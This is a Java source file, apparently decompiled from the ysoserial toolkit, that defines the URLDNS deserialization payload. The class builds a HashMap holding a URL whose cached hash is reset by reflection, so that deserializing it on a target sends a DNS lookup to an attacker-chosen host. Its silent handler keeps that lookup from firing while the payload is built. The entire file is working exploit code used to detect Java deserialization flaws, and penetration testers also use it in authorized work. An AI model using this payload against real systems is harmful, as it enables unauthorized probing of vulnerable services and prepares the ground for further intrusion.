package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@Authors({Authors.GEBL})
@Dependencies
@PayloadTest(skip = "true")
/* loaded from: ysoserial-all.jar:ysoserial/payloads/URLDNS.class */
public class URLDNS implements ObjectPayload<Object> {
    @Override // ysoserial.payloads.ObjectPayload
    public Object getObject(String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap();
        URL u = new URL((URL) null, url, handler);
        ht.put(u, url);
        Reflections.setFieldValue(u, "hashCode", -1);
        return ht;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(URLDNS.class, args);
    }

    /* loaded from: ysoserial-all.jar:ysoserial/payloads/URLDNS$SilentURLStreamHandler.class */
    static class SilentURLStreamHandler extends URLStreamHandler {
        SilentURLStreamHandler() {
        }

        @Override // java.net.URLStreamHandler
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override // java.net.URLStreamHandler
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}